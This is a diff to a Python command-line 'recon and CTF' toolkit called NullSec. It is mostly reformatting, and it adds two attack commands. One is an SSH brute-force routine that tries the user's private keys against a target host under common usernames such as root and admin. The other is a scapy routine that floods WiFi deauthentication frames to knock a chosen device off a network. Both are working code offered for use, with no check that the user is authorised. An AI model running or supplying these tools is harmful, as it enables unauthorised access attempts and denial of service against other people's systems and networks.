@@ -7,18 +7,31 @@ from rich.panel import Panel
 console = Console()
 import os, sys, socket, base64, hashlib, subprocess, platform, urllib.request, urllib.parse, json, time, string
 import readline
+
+try:
+    import paramiko
+
+    HAS_PARAMIKO = True
+except ImportError:
+    HAS_PARAMIKO = False
+try:
+    from scapy.all import RadioTap, Dot11, Dot11AuthReq, Dot11Deauth, sendp, conf
+
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
 init(autoreset=True)
 
-RED   = Fore.RED
+RED = Fore.RED
 GREEN = Fore.GREEN
 YELLOW = Fore.YELLOW
-BLUE  = Fore.BLUE
+BLUE = Fore.BLUE
 RESET = Style.RESET_ALL
 BRIGHT = Style.BRIGHT
 
-version      = os.environ.get("APP_VERSION", "V1.0")
-current_dir  = os.getcwd()
-username_pc  = os.getlogin()
+version = "V2.1"
+current_dir = os.getcwd()
+username_pc = os.getlogin()
 
 if sys.platform.startswith("win"):
     os_name = "Windows"
@@ -30,14 +43,45 @@ else:
 # ─── Theme system ──────────────────────────────────────────────────────────────
 
 THEMES = {
-    "red":    {"primary": Fore.RED,     "accent": Fore.YELLOW,  "rich": "bold red",     "ansi": "\033[1;31m"},
-    "green":  {"primary": Fore.GREEN,   "accent": Fore.CYAN,    "rich": "bold green",   "ansi": "\033[1;32m"},
-    "cyan":   {"primary": Fore.CYAN,    "accent": Fore.GREEN,   "rich": "bold cyan",    "ansi": "\033[1;36m"},
-    "blue":   {"primary": Fore.BLUE,    "accent": Fore.CYAN,    "rich": "bold blue",    "ansi": "\033[1;34m"},
-    "yellow": {"primary": Fore.YELLOW,  "accent": Fore.RED,     "rich": "bold yellow",  "ansi": "\033[1;33m"},
-    "purple": {"primary": Fore.MAGENTA, "accent": Fore.CYAN,    "rich": "bold magenta", "ansi": "\033[1;35m"},
+    "red": {
+        "primary": Fore.RED,
+        "accent": Fore.YELLOW,
+        "rich": "bold red",
+        "ansi": "\033[1;31m",
+    },
+    "green": {
+        "primary": Fore.GREEN,
+        "accent": Fore.CYAN,
+        "rich": "bold green",
+        "ansi": "\033[1;32m",
+    },
+    "cyan": {
+        "primary": Fore.CYAN,
+        "accent": Fore.GREEN,
+        "rich": "bold cyan",
+        "ansi": "\033[1;36m",
+    },
+    "blue": {
+        "primary": Fore.BLUE,
+        "accent": Fore.CYAN,
+        "rich": "bold blue",
+        "ansi": "\033[1;34m",
+    },
+    "yellow": {
+        "primary": Fore.YELLOW,
+        "accent": Fore.RED,
+        "rich": "bold yellow",
+        "ansi": "\033[1;33m",
+    },
+    "purple": {
+        "primary": Fore.MAGENTA,
+        "accent": Fore.CYAN,
+        "rich": "bold magenta",
+        "ansi": "\033[1;35m",
+    },
 }
 THEME_FILE = ".nullsec_theme"
+
 
 def load_theme():
     try:
@@ -49,39 +93,54 @@ def load_theme():
         pass
     return "red", THEMES["red"]
 
+
 def apply_theme(name):
     t = THEMES[name]
-    globals()["RED"]        = t["primary"]
-    globals()["YELLOW"]     = t["accent"]
+    globals()["RED"] = t["primary"]
+    globals()["YELLOW"] = t["accent"]
     globals()["RICH_STYLE"] = t["rich"]
     globals()["ANSI_STYLE"] = t["ansi"]
     with open(THEME_FILE, "w") as f:
         f.write(name)
 
+
 current_theme, _t = load_theme()
-RED        = _t["primary"]
-YELLOW     = _t["accent"]
+RED = _t["primary"]
+YELLOW = _t["accent"]
 RICH_STYLE = _t["rich"]
 ANSI_STYLE = _t["ansi"]
 
 # ─── Changelog ─────────────────────────────────────────────────────────────────
 
 CHANGELOG = [
-    ("V1.0", [
-        "Initial release",
-        "Core navigation commands (cd, ls, pwd, open)",
-        "Network tools: ping, myip, dns, whois, portscan",
-        "Encoding: b64, hex, url, rot/caesar",
-        "Crypto: hashcrack, jwt decoder",
-        "Analysis: sysinfo, fcheck, passcheck, strings, hexdump",
-        "HTTP tools: headers, subdomains, geoip, bannergrab",
-        "Typewriter banner effect",
-        "Theme switcher",
-        "Tab completion",
-    ]),
+    (
+        "V2.1",
+        [
+            "SSH key brute-force tool (sshbrute)",
+            "WiFi deauth attack tool (wifideauth)",
+            "Plugin system with auto-detection",
+            "Plugins folder: nullsec/plugins/",
+        ],
+    ),
+    (
+        "V2.0",
+        [
+            "Rework + Split",
+            "Core navigation commands (cd, ls, pwd, open)",
+            "Network tools: ping, myip, dns, whois, portscan",
+            "Encoding: b64, hex, url, rot/caesar",
+            "Crypto: hashcrack, jwt decoder",
+            "Analysis: sysinfo, fcheck, passcheck, strings, hexdump",
+            "HTTP tools: headers, subdomains, geoip, bannergrab",
+            "Typewriter banner effect",
+            "Theme switcher",
+            "Tab completion",
+        ],
+    ),
 ]
 
 # ─── Handlers ─────────────────────────────────────────────────────────────────
+
 
 def handle_help(args):
     help_text = Text.from_ansi(f"""
@@ -107,6 +166,8 @@ def handle_help(args):
   subdomains <domain>    Enumerate subdomains
   geoip <ip|domain>      Geolocate an IP or domain
   bannergrab <host> <port> Grab service banner from a port
+  sshbrute <host> <port> <wordlist>  SSH key brute-force
+  wifideauth <target> <bssid> [iface] WiFi deauth attack
 
 [{RED}System{RESET}]
   sysinfo                OS, CPU, RAM, IP, hostname
@@ -133,7 +194,9 @@ def handle_help(args):
 """)
     console.print(Panel.fit(help_text, border_style=RICH_STYLE, title="NullSec Help"))
 
+
 # ── Navigation ────────────────────────────────────────────────────────────────
+
 
 def handle_ls(args):
     path = args[0] if args else "."
@@ -142,6 +205,7 @@ def handle_ls(args):
             print(item)
     except FileNotFoundError:
         print(f"[{RED}!{RESET}] Directory not found")
+
 
 def handle_open(args):
     if not args:
@@ -157,6 +221,7 @@ def handle_open(args):
     except UnicodeDecodeError:
         print(f"[{RED}!{RESET}] Cannot read binary file: {args[0]}")
 
+
 def handle_cd(args):
     global current_dir
     if not args:
@@ -169,33 +234,40 @@ def handle_cd(args):
     else:
         print(f"No such directory: {args[0]}")
 
+
 def handle_pwd(args):
     print(current_dir)
+
 
 def handle_clear(args):
     clear()
     show_banner()
 
+
 def handle_exit(args):
     clear()
     sys.exit()
 
+
 def handle_echo(args):
     print(" ".join(args))
 
+
 # ── Network ───────────────────────────────────────────────────────────────────
+
 
 def handle_ping(args):
     if not args:
         print(f"[{RED}Usage{RESET}] ping <host>")
         return
-    host  = args[0]
+    host = args[0]
     count = args[1] if len(args) > 1 else "4"
     print(f"[{GREEN}>{RESET}] Pinging {host}...")
     try:
-        flag   = "-n" if os.name == "nt" else "-c"
-        result = subprocess.run(["ping", flag, count, host],
-                                capture_output=True, text=True, timeout=15)
+        flag = "-n" if os.name == "nt" else "-c"
+        result = subprocess.run(
+            ["ping", flag, count, host], capture_output=True, text=True, timeout=15
+        )
         print(result.stdout)
         if result.returncode != 0:
             print(f"[{RED}!{RESET}] Host unreachable or not found")
@@ -203,6 +275,7 @@ def handle_ping(args):
         print(f"[{RED}!{RESET}] Ping timed out")
     except FileNotFoundError:
         print(f"[{RED}!{RESET}] ping not available on this system")
+
 
 def handle_myip(args):
     print(f"[{GREEN}>{RESET}] Fetching public IP...")
@@ -212,6 +285,7 @@ def handle_myip(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] Could not fetch public IP: {e}")
 
+
 def handle_dns(args):
     if not args:
         print(f"[{RED}Usage{RESET}] dns <domain>")
@@ -219,12 +293,13 @@ def handle_dns(args):
     domain = args[0]
     try:
         results = socket.getaddrinfo(domain, None)
-        ips     = sorted(set(r[4][0] for r in results))
+        ips = sorted(set(r[4][0] for r in results))
         print(f"[{GREEN}>{RESET}] {domain}")
         for ip in ips:
             print(f"    {ip}")
     except socket.gaierror as e:
         print(f"[{RED}!{RESET}] DNS lookup failed: {e}")
+
 
 def handle_whois(args):
     if not args:
@@ -232,11 +307,26 @@ def handle_whois(args):
         return
     domain = args[0]
     try:
-        result   = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
-        keywords = ["domain", "registrar", "creation", "expir", "updated",
-                    "name server", "registrant", "country", "status", "organisation"]
-        useful   = [f"  {l.strip()}" for l in result.stdout.splitlines()
-                    if any(k in l.lower() for k in keywords) and ":" in l]
+        result = subprocess.run(
+            ["whois", domain], capture_output=True, text=True, timeout=10
+        )
+        keywords = [
+            "domain",
+            "registrar",
+            "creation",
+            "expir",
+            "updated",
+            "name server",
+            "registrant",
+            "country",
+            "status",
+            "organisation",
+        ]
+        useful = [
+            f"  {l.strip()}"
+            for l in result.stdout.splitlines()
+            if any(k in l.lower() for k in keywords) and ":" in l
+        ]
         if useful:
             print(f"\n[{GREEN}>{RESET}] whois {domain}\n")
             print("\n".join(useful[:30]))
@@ -247,12 +337,13 @@ def handle_whois(args):
     except subprocess.TimeoutExpired:
         print(f"[{RED}!{RESET}] whois timed out")
 
+
 def handle_portscan(args):
     if not args:
         print(f"[{RED}Usage{RESET}] portscan <host> [startport-endport]")
         return
-    host        = args[0]
-    port_range  = args[1] if len(args) > 1 else "1-1024"
+    host = args[0]
+    port_range = args[1] if len(args) > 1 else "1-1024"
     try:
         start, end = map(int, port_range.split("-"))
     except ValueError:
@@ -282,6 +373,7 @@ def handle_portscan(args):
     else:
         print(f"\n[{GREEN}>{RESET}] Found {len(open_ports)} open port(s)")
 
+
 def handle_headers(args):
     if not args:
         print(f"[{RED}Usage{RESET}] headers <url>")
@@ -298,6 +390,7 @@ def handle_headers(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] Error: {e}")
 
+
 def handle_subdomains(args):
     if not args:
         print(f"[{RED}Usage{RESET}] subdomains <domain>")
@@ -305,13 +398,46 @@ def handle_subdomains(args):
     domain = args[0]
     # common subdomain wordlist — enough to be useful for learning
     wordlist = [
-        "www", "mail", "ftp", "smtp", "pop", "imap", "vpn", "remote",
-        "dev", "staging", "test", "api", "admin", "portal", "app",
-        "blog", "shop", "cdn", "static", "assets", "media", "img",
-        "ns1", "ns2", "dns", "mx", "webmail", "secure", "login",
-        "dashboard", "m", "mobile", "beta", "old", "new", "status",
+        "www",
+        "mail",
+        "ftp",
+        "smtp",
+        "pop",
+        "imap",
+        "vpn",
+        "remote",
+        "dev",
+        "staging",
+        "test",
+        "api",
+        "admin",
+        "portal",
+        "app",
+        "blog",
+        "shop",
+        "cdn",
+        "static",
+        "assets",
+        "media",
+        "img",
+        "ns1",
+        "ns2",
+        "dns",
+        "mx",
+        "webmail",
+        "secure",
+        "login",
+        "dashboard",
+        "m",
+        "mobile",
+        "beta",
+        "old",
+        "new",
+        "status",
     ]
-    print(f"[{GREEN}>{RESET}] Enumerating subdomains for {domain} ({len(wordlist)} candidates)...\n")
+    print(
+        f"[{GREEN}>{RESET}] Enumerating subdomains for {domain} ({len(wordlist)} candidates)...\n"
+    )
     found = []
     try:
         for sub in wordlist:
@@ -326,22 +452,25 @@ def handle_subdomains(args):
         print(f"\n[{RED}!{RESET}] Interrupted")
     print(f"\n[{GREEN}>{RESET}] Found {len(found)} subdomain(s)")
 
+
 # ── System ────────────────────────────────────────────────────────────────────
+
 
 def handle_sysinfo(args):
     try:
         hostname = socket.gethostname()
         local_ip = socket.gethostbyname(hostname)
-        os_info  = platform.platform()
-        cpu      = platform.processor() or platform.machine()
-        arch     = platform.architecture()[0]
+        os_info = platform.platform()
+        cpu = platform.processor() or platform.machine()
+        arch = platform.architecture()[0]
         try:
             import psutil
+
             ram_total = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
-            ram_used  = f"{psutil.virtual_memory().percent}% used"
+            ram_used = f"{psutil.virtual_memory().percent}% used"
         except ImportError:
             ram_total = "install psutil for RAM info"
-            ram_used  = ""
+            ram_used = ""
 
         info = Text.from_ansi(f"""
   [{RED}Hostname{RESET}]   {hostname}
@@ -355,13 +484,14 @@ def handle_sysinfo(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] sysinfo error: {e}")
 
+
 def handle_fcheck(args):
     if not args:
         print(f"[{RED}Usage{RESET}] fcheck <directory>")
         print(f"         First run: takes a snapshot")
         print(f"         Second run: compares against snapshot")
         return
-    target   = os.path.abspath(args[0])
+    target = os.path.abspath(args[0])
     snapfile = f".fcheck_{target.replace(os.sep, '_').strip('_')}.json"
 
     def snapshot(path):
@@ -390,7 +520,7 @@ def handle_fcheck(args):
             old = json.load(f)
         new = snapshot(target)
 
-        added   = [k for k in new if k not in old]
+        added = [k for k in new if k not in old]
         removed = [k for k in old if k not in new]
         changed = [k for k in new if k in old and new[k] != old[k]]
 
@@ -398,13 +528,16 @@ def handle_fcheck(args):
             print(f"[{GREEN}+{RESET}] No changes detected")
         if added:
             print(f"\n[{GREEN}+{RESET}] New files ({len(added)}):")
-            for f in added:   print(f"    {f}")
+            for f in added:
+                print(f"    {f}")
         if removed:
             print(f"\n[{RED}!{RESET}] Removed files ({len(removed)}):")
-            for f in removed: print(f"    {f}")
+            for f in removed:
+                print(f"    {f}")
         if changed:
             print(f"\n[{YELLOW}~{RESET}] Modified files ({len(changed)}):")
-            for f in changed: print(f"    {f}")
+            for f in changed:
+                print(f"    {f}")
 
         choice = input(f"\n[{RED}>{RESET}] Update snapshot? (y/n) ").strip().lower()
         if choice == "y":
@@ -412,7 +545,9 @@ def handle_fcheck(args):
                 json.dump(new, f, indent=2)
             print(f"[{GREEN}+{RESET}] Snapshot updated")
 
+
 # ── Encoding & Crypto ─────────────────────────────────────────────────────────
+
 
 def handle_encode(args):
     if len(args) < 2:
@@ -430,6 +565,7 @@ def handle_encode(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] Encode error: {e}")
 
+
 def handle_decode(args):
     if len(args) < 2:
         print(f"[{RED}Usage{RESET}] decode <b64|hex> <text>")
@@ -446,6 +582,7 @@ def handle_decode(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] Decode error: {e}")
 
+
 def handle_rot(args):
     if len(args) < 2:
         print(f"[{RED}Usage{RESET}] rot <shift> <text>   (rot 13 hello)")
@@ -455,7 +592,7 @@ def handle_rot(args):
     except ValueError:
         print(f"[{RED}!{RESET}] Shift must be a number")
         return
-    text   = " ".join(args[1:])
+    text = " ".join(args[1:])
     result = []
     for ch in text:
         if ch.isalpha():
@@ -465,16 +602,24 @@ def handle_rot(args):
             result.append(ch)
     print(f"[{GREEN}>{RESET}] {''.join(result)}")
 
+
 def handle_hashcrack(args):
     if len(args) < 2:
         print(f"[{RED}Usage{RESET}] hashcrack <hash> <wordlist_file>")
         return
-    target   = args[0].lower()
+    target = args[0].lower()
     wordlist = args[1]
 
     # auto-detect hash type by length
-    ALGOS = {32: "md5", 40: "sha1", 56: "sha224", 64: "sha256", 96: "sha384", 128: "sha512"}
-    algo  = ALGOS.get(len(target))
+    ALGOS = {
+        32: "md5",
+        40: "sha1",
+        56: "sha224",
+        64: "sha256",
+        96: "sha384",
+        128: "sha512",
+    }
+    algo = ALGOS.get(len(target))
     if not algo:
         print(f"[{RED}!{RESET}] Unrecognised hash length ({len(target)} chars)")
         return
@@ -487,16 +632,17 @@ def handle_hashcrack(args):
     try:
         with open(wordlist, "r", errors="ignore") as f:
             for i, line in enumerate(f):
-                word  = line.rstrip("\n")
+                word = line.rstrip("\n")
                 guess = hashlib.new(algo, word.encode()).hexdigest()
                 if guess == target:
-                    print(f"[{GREEN}+{RESET}] CRACKED after {i+1} attempts: {word}")
+                    print(f"[{GREEN}+{RESET}] CRACKED after {i + 1} attempts: {word}")
                     return
                 if i % 10000 == 0 and i > 0:
                     print(f"  [{YELLOW}~{RESET}] {i} tried...", end="\r")
         print(f"[{RED}!{RESET}] Hash not found in wordlist")
     except KeyboardInterrupt:
         print(f"\n[{RED}!{RESET}] Interrupted")
+
 
 def handle_jwt(args):
     if not args:
@@ -508,12 +654,13 @@ def handle_jwt(args):
         print(f"[{RED}!{RESET}] Not a valid JWT (expected 3 parts)")
         return
     try:
+
         def decode_part(p):
             # add padding if needed
             p += "=" * (4 - len(p) % 4)
             return json.loads(base64.urlsafe_b64decode(p).decode())
 
-        header  = decode_part(parts[0])
+        header = decode_part(parts[0])
         payload = decode_part(parts[1])
 
         info = Text.from_ansi(f"""
@@ -528,6 +675,7 @@ def handle_jwt(args):
         console.print(Panel.fit(info, border_style=RICH_STYLE, title="JWT Decoded"))
     except Exception as e:
         print(f"[{RED}!{RESET}] JWT decode error: {e}")
+
 
 def handle_geoip(args):
     if not args:
@@ -548,17 +696,18 @@ def handle_geoip(args):
             print(f"[{RED}!{RESET}] Lookup failed for {ip}")
             return
         info = Text.from_ansi(f"""
-  [{RED}IP{RESET}]         {data.get('query')}
-  [{RED}Country{RESET}]    {data.get('country')}
-  [{RED}Region{RESET}]     {data.get('regionName')}
-  [{RED}City{RESET}]       {data.get('city')}
-  [{RED}ISP{RESET}]        {data.get('isp')}
-  [{RED}Org{RESET}]        {data.get('org')}
-  [{RED}Lat/Lon{RESET}]    {data.get('lat')}, {data.get('lon')}
+  [{RED}IP{RESET}]         {data.get("query")}
+  [{RED}Country{RESET}]    {data.get("country")}
+  [{RED}Region{RESET}]     {data.get("regionName")}
+  [{RED}City{RESET}]       {data.get("city")}
+  [{RED}ISP{RESET}]        {data.get("isp")}
+  [{RED}Org{RESET}]        {data.get("org")}
+  [{RED}Lat/Lon{RESET}]    {data.get("lat")}, {data.get("lon")}
 """)
         console.print(Panel.fit(info, border_style=RICH_STYLE, title=f"GeoIP — {ip}"))
     except Exception as e:
         print(f"[{RED}!{RESET}] GeoIP error: {e}")
+
 
 def handle_urlencode(args):
     if len(args) < 2:
@@ -573,35 +722,49 @@ def handle_urlencode(args):
     else:
         print(f"[{RED}!{RESET}] Unknown mode (use encode or decode)")
 
+
 def handle_passcheck(args):
     if not args:
         print(f"[{RED}Usage{RESET}] passcheck <password>")
         return
     pw = " ".join(args)
-    score  = 0
+    score = 0
     issues = []
-    tips   = []
+    tips = []
 
-    if len(pw) >= 8:  score += 1
-    else: issues.append("Too short (min 8 chars)")
+    if len(pw) >= 8:
+        score += 1
+    else:
+        issues.append("Too short (min 8 chars)")
 
-    if len(pw) >= 12: score += 1
-    else: tips.append("12+ chars is better")
+    if len(pw) >= 12:
+        score += 1
+    else:
+        tips.append("12+ chars is better")
 
-    if len(pw) >= 16: score += 1
+    if len(pw) >= 16:
+        score += 1
 
-    if any(c.isupper() for c in pw): score += 1
-    else: issues.append("No uppercase letters")
+    if any(c.isupper() for c in pw):
+        score += 1
+    else:
+        issues.append("No uppercase letters")
 
-    if any(c.islower() for c in pw): score += 1
-    else: issues.append("No lowercase letters")
+    if any(c.islower() for c in pw):
+        score += 1
+    else:
+        issues.append("No lowercase letters")
 
-    if any(c.isdigit() for c in pw): score += 1
-    else: issues.append("No numbers")
+    if any(c.isdigit() for c in pw):
+        score += 1
+    else:
+        issues.append("No numbers")
 
     special = set(string.punctuation)
-    if any(c in special for c in pw): score += 1
-    else: issues.append("No special characters (!@#$ etc)")
+    if any(c in special for c in pw):
+        score += 1
+    else:
+        issues.append("No special characters (!@#$ etc)")
 
     common = ["password", "123456", "qwerty", "letmein", "admin", "welcome", "monkey"]
     if pw.lower() in common:
@@ -609,11 +772,11 @@ def handle_passcheck(args):
         issues.append("This is one of the most common passwords!")
 
     ratings = {
-        range(0, 3): (f"[{RED}VERY WEAK{RESET}]",   RED),
-        range(3, 5): (f"[{RED}WEAK{RESET}]",         RED),
-        range(5, 6): (f"[{YELLOW}MODERATE{RESET}]",  YELLOW),
-        range(6, 7): (f"[{GREEN}STRONG{RESET}]",     GREEN),
-        range(7, 8): (f"[{GREEN}VERY STRONG{RESET}]",GREEN),
+        range(0, 3): (f"[{RED}VERY WEAK{RESET}]", RED),
+        range(3, 5): (f"[{RED}WEAK{RESET}]", RED),
+        range(5, 6): (f"[{YELLOW}MODERATE{RESET}]", YELLOW),
+        range(6, 7): (f"[{GREEN}STRONG{RESET}]", GREEN),
+        range(7, 8): (f"[{GREEN}VERY STRONG{RESET}]", GREEN),
     }
     label = next(v[0] for k, v in ratings.items() if score in k)
 
@@ -621,11 +784,14 @@ def handle_passcheck(args):
     print(f"  Score    : {score}/7  {label}")
     if issues:
         print(f"\n  [{RED}Issues{RESET}]")
-        for i in issues: print(f"    • {i}")
+        for i in issues:
+            print(f"    • {i}")
     if tips:
         print(f"\n  [{YELLOW}Tips{RESET}]")
-        for t in tips: print(f"    • {t}")
+        for t in tips:
+            print(f"    • {t}")
     print()
+
 
 def handle_bannergrab(args):
     if not args:
@@ -660,18 +826,21 @@ def handle_bannergrab(args):
     except Exception as e:
         print(f"[{RED}!{RESET}] Error: {e}")
 
+
 def handle_strings(args):
     if not args:
         print(f"[{RED}Usage{RESET}] strings <file> [minlength]")
         print(f"         e.g. strings binary.exe 6")
         return
-    filepath  = args[0]
-    min_len   = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
+    filepath = args[0]
+    min_len = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
     printable = set(string.printable) - set("\t\n\r\x0b\x0c")
     if not os.path.exists(filepath):
         print(f"[{RED}!{RESET}] File not found: {filepath}")
         return
-    print(f"[{GREEN}>{RESET}] Extracting strings (min length {min_len}) from {filepath}...\n")
+    print(
+        f"[{GREEN}>{RESET}] Extracting strings (min length {min_len}) from {filepath}...\n"
+    )
     found = 0
     try:
         with open(filepath, "rb") as f:
@@ -694,24 +863,25 @@ def handle_strings(args):
     except KeyboardInterrupt:
         print(f"\n[{RED}!{RESET}] Interrupted — {found} strings shown")
 
+
 def handle_hexdump(args):
     if not args:
         print(f"[{RED}Usage{RESET}] hexdump <file> [bytes]")
         print(f"         e.g. hexdump file.bin 256")
         return
     filepath = args[0]
-    limit    = int(args[1]) if len(args) > 1 and args[1].isdigit() else 256
+    limit = int(args[1]) if len(args) > 1 and args[1].isdigit() else 256
     if not os.path.exists(filepath):
         print(f"[{RED}!{RESET}] File not found: {filepath}")
         return
     try:
         with open(filepath, "rb") as f:
             data = f.read(limit)
-        print(f"\n[{GREEN}>{RESET}] Hex dump of {filepath} (first {len(data)} bytes)\n")
+        print(f"\n[{GREEN}+{RESET}] Hex dump of {filepath} (first {len(data)} bytes)\n")
         print(f"  {'Offset':<10} {'Hex':<48} {'ASCII'}")
-        print(f"  {'-'*10} {'-'*47} {'-'*16}")
+        print(f"  {'-' * 10} {'-' * 47} {'-' * 16}")
         for i in range(0, len(data), 16):
-            chunk   = data[i:i+16]
+            chunk = data[i : i + 16]
             hex_str = " ".join(f"{b:02x}" for b in chunk)
             asc_str = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
             print(f"  {i:08x}   {hex_str:<47}  {asc_str}")
@@ -719,7 +889,119 @@ def handle_hexdump(args):
     except PermissionError:
         print(f"[{RED}!{RESET}] Permission denied: {filepath}")
 
+
+def handle_sshbrute(args):
+    if not HAS_PARAMIKO:
+        print(f"[{RED}!{RESET}] paramiko not installed — pip install paramiko")
+        return
+    if len(args) < 3:
+        print(f"[{RED}Usage{RESET}] sshbrute <host> <port> <wordlist>")
+        print(f"         Tries SSH key authentication against target")
+        return
+    host = args[0]
+    try:
+        port = int(args[1])
+    except ValueError:
+        print(f"[{RED}!{RESET}] Port must be a number")
+        return
+    wordlist = args[2]
+    if not os.path.exists(wordlist):
+        print(f"[{RED}!{RESET}] Wordlist not found: {wordlist}")
+        return
+
+    key_paths = [
+        os.path.expanduser("~/.ssh/id_rsa"),
+        os.path.expanduser("~/.ssh/id_ed25519"),
+        os.path.expanduser("~/.ssh/id_ecdsa"),
+        os.path.expanduser("~/.ssh/id_dsa"),
+    ]
+    available_keys = [k for k in key_paths if os.path.exists(k)]
+
+    print(f"[{GREEN}>{RESET}] SSH key brute-force on {host}:{port}")
+    print(f"         Using {len(available_keys)} available keys from ~/.ssh/")
+    print(f"         Also trying common usernames...\n")
+
+    usernames = ["root", "admin", "user", "ubuntu", "ec2-user", "pi", "guest"]
+    found = False
+
+    for key_path in available_keys:
+        try:
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+        except paramiko.ssh_exception.PasswordLockedException:
+            print(f"  [{YELLOW}~{RESET}] Skipping encrypted key: {key_path}")
+            continue
+        except Exception:
+            continue
+
+        for user in usernames:
+            try:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(host, port=port, username=user, pkey=key, timeout=5)
+                print(f"[{GREEN}+{RESET}] SUCCESS! Connected as {user} with {key_path}")
+                print(f"         Key file: {key_path}")
+                found = True
+                ssh.close()
+                if found:
+                    return
+            except paramiko.ssh_exception.AuthenticationException:
+                pass
+            except paramiko.ssh_exception.NoValidConnectionsError:
+                print(f"[{RED}!{RESET}] Cannot connect to {host}:{port}")
+                return
+            except socket.timeout:
+                print(f"[{RED}!{RESET}] Connection timeout")
+                return
+            except Exception as e:
+                pass
+
+    if not found:
+        print(f"[{RED}!{RESET}] No valid SSH key found")
+
+
+def handle_wifideauth(args):
+    if not HAS_SCAPY:
+        print(f"[{RED}!{RESET}] scapy not installed — pip install scapy")
+        return
+    if len(args) < 2:
+        print(f"[{RED}Usage{RESET}] wifideauth <target_mac> <bssid> [iface]")
+        print(f"         Send deauth packets to disconnect target from WiFi")
+        print(f"         Example: wifideauth AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 wlan0")
+        return
+    target_mac = args[0].upper()
+    bssid = args[1].upper()
+    iface = args[2] if len(args) > 2 else conf.iface
+
+    try:
+        if len(target_mac.replace(":", "")) != 12 or len(bssid.replace(":", "")) != 12:
+            print(f"[{RED}!{RESET}] Invalid MAC address format (AA:BB:CC:DD:EE:FF)")
+            return
+    except:
+        print(f"[{RED}!{RESET}] Invalid MAC address format")
+        return
+
+    print(f"[{GREEN}>{RESET}] Starting deauth attack...")
+    print(f"         Target : {target_mac}")
+    print(f"         Router : {bssid}")
+    print(f"         Interface : {iface}")
+    print(f"         [{RED}Press Ctrl+C to stop{RESET}]")
+
+    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
+    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+    try:
+        print(f"\n[{GREEN}>{RESET}] Sending deauth packets... (Ctrl+C to stop)")
+        sendp(frame, iface=iface, loop=1, inter=0.1, verbose=1)
+    except KeyboardInterrupt:
+        print(f"\n[{RED}!{RESET}] Deauth attack stopped")
+    except OSError as e:
+        print(f"[{RED}!{RESET}] Interface error: {e}")
+        print(f"         Make sure {iface} is in monitor mode:")
+        print(f"         sudo airmon-ng start {iface}")
+
+
 # ── Core ──────────────────────────────────────────────────────────────────────
+
 
 def handle_theme(args):
     global current_theme, RED, YELLOW, RICH_STYLE, ANSI_STYLE
@@ -735,6 +1017,7 @@ def handle_theme(args):
     apply_theme(name)
     print(f"[{GREEN}+{RESET}] Theme set to: {name}")
 
+
 def handle_changelog(args):
     text = Text.from_ansi(f"\n[{RED}Version History{RESET}]\n")
     for ver, changes in reversed(CHANGELOG):
@@ -743,15 +1026,19 @@ def handle_changelog(args):
             text.append(f"    • {c}\n")
     console.print(Panel.fit(text, border_style=RICH_STYLE, title="Changelog"))
 
+
 def handle_back(args):
     clear()
     raise SystemExit("__back__")
 
+
 def clear():
     os.system("clear" if os.name != "nt" else "cls")
 
+
 def sutils():
     sys.stdout.write(f"\x1b]2;NullSec {version}\x07")
+
 
 def slow_print(text, delay=0.045):
     reset = "\033[0m"
@@ -761,6 +1048,7 @@ def slow_print(text, delay=0.045):
         sys.stdout.write(" " * pad + ANSI_STYLE + line + reset + "\n")
         sys.stdout.flush()
         time.sleep(delay)
+
 
 def banner():
     logo = r"""
@@ -778,73 +1066,110 @@ def banner():
         f"[{RED}GITHUB{RESET}] https://github.com/sxlar333/nullsec  "
         f"[{RED}DISCORD{RESET}] https://discord.gg/dwte3mus4W"
     )
-    console.print(Align.center(Panel.fit(links, border_style=RICH_STYLE, title="Links")))
+    console.print(
+        Align.center(Panel.fit(links, border_style=RICH_STYLE, title="Links"))
+    )
     slow_print(logo)
     info = Text.from_ansi(
         f"NullSec [{RED}{version}{RESET}]  [{RED}INFO{RESET}] Recon/Network & CTF Toolkit"
     )
     console.print(Align.center(Panel.fit(info, border_style=RICH_STYLE)))
 
+
 def menu():
+    from plugins import load_plugins, get_plugin_commands
+
+    load_plugins()
+    plugins = get_plugin_commands()
+
     menu_options = Text.from_ansi(f"""
-  [{RED}Network{RESET}]    ping  myip  dns  whois  portscan  headers  subdomains  geoip  bannergrab
+  [{RED}Network{RESET}]    ping  myip  dns  whois  portscan  headers  subdomains  geoip  bannergrab  sshbrute  wifideauth
   [{RED}System{RESET}]     sysinfo  fcheck
   [{RED}Crypto{RESET}]     encode  decode  url  rot  hashcrack  jwt
   [{RED}Analysis{RESET}]   passcheck  strings  hexdump
   [{RED}Files{RESET}]      ls  cd  pwd  open  echo  clear
   [{RED}Other{RESET}]      theme  changelog  back  help  exit
     """)
-    console.print(Panel(menu_options, title="NullSec Commands", border_style=RICH_STYLE))
+    console.print(
+        Panel(menu_options, title="NullSec Commands", border_style=RICH_STYLE)
+    )
+
+    if plugins:
+        plugin_cmds = "  ".join(
+            "  ".join(p.get("commands", [])) for p in plugins.values()
+        )
+        plugin_text = Text.from_ansi(plugin_cmds)
+        console.print(
+            Panel(
+                plugin_text, title=f"Plugins ({len(plugins)})", border_style=RICH_STYLE
+            )
+        )
+
 
 def show_banner():
     banner()
     menu()
 
+
 def input_loop():
     commands = {
-        "clear":      handle_clear,
-        "exit":       handle_exit,
-        "e":          handle_exit,
-        "echo":       handle_echo,
-        "cd":         handle_cd,
-        "pwd":        handle_pwd,
-        "help":       handle_help,
-        "open":       handle_open,
-        "ls":         handle_ls,
-        "dir":        handle_ls,
-        "ping":       handle_ping,
-        "myip":       handle_myip,
-        "dns":        handle_dns,
-        "whois":      handle_whois,
-        "portscan":   handle_portscan,
-        "headers":    handle_headers,
+        "clear": handle_clear,
+        "cls": handle_clear,
+        "c": handle_clear,
